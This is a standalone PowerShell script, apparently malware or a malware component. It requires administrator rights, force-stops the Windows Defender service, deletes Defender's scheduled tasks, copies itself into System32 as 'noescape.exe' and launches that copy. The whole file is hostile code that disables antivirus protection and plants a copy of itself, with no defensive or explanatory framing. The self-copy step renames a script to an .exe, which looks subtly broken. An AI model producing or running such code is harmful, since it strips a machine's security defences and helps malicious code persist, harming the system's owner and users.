if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    Write-Warning "This script must be run as Administrator."
    exit
}

try {
    Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
    Write-Output "Windows Defender service stopped."

    $taskPath = "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender"
    if (Test-Path $taskPath) {
        Remove-Item -Path $taskPath -Recurse -Force -ErrorAction Stop
        Write-Output "Windows Defender scheduled tasks removed."
    }
    else {
        Write-Output "Windows Defender scheduled tasks path does not exist."
    }

    $destination = "C:\Windows\System32\noescape.exe"
    Copy-Item -Path $PSCommandPath -Destination $destination -Force -ErrorAction Stop
    Write-Output "Script copied to $destination."

    Start-Process -FilePath $destination -ErrorAction Stop
    Write-Output "Copied script started."
}
catch {
    Write-Error "Error occurred: $_"
}